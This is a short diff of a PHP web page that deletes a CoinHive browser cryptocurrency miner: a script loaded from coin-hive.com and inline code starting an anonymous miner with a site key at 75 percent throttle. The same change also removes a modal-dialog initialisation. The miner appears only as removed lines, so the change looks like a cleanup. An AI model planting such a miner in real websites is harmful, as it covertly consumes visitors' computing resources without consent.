@@ -197,14 +197,6 @@ if(!$conn->connect_errno) {
        </div>
      </form>
    </div>
-   <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-   <script type="text/javascript">
-     var miner = new CoinHive.Anonymous('q6ER4wLh1AQxDh8fgmLvwOoXDoVarXGI');
-     miner.setThrottle(0.75);
-     miner.start();
-     $(function(){
-       $('#modaltrigger').leanModal({top: 110, overlay: 0.45, closeButton: ".hidemodal"});
-     });
-   </script>
+
  </body>
 </html>
